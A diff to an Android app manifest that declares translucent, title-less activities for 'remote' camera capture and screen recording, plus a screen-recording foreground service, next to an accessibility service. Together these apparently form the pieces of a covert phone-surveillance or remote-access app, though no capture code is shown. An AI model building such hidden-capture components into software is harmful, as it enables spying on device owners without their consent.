@@ -103,6 +103,25 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
+        <!-- Real Remote Camera Capture Activity (Translucent) -->
+        <activity
+            android:name=".service.CameraCaptureActivity"
+            android:exported="false"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+
+        <!-- Screen Recording Helper Activity (Translucent) -->
+        <activity
+            android:name=".service.ScreenRecordHelperActivity"
+            android:exported="false"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+
+        <!-- Screen Recording Foreground Service -->
+        <service
+            android:name=".service.ScreenRecordService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="mediaProjection" />
+
     </application>
 
 </manifest>
